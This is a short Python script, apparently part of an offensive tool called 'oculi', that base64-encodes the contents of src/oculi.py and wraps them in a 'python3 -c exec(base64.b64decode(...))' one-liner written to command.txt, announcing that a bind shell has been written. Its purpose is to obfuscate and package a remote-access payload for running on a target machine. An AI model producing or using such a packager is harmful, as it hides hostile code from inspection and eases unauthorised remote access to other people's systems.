import base64
with open('src/oculi.py','rb') as o:
    code = o.read()
    o.close()
with open('command.txt','wb') as w:
    w.write(bytes("""python3 -c "import base64;exec(base64.b64decode(b'""",'utf-8'))
    w.write(base64.b64encode(code))
    w.write(bytes("""').decode())" """,'utf-8'))
    w.close()

print("Bind shell written to command.txt")
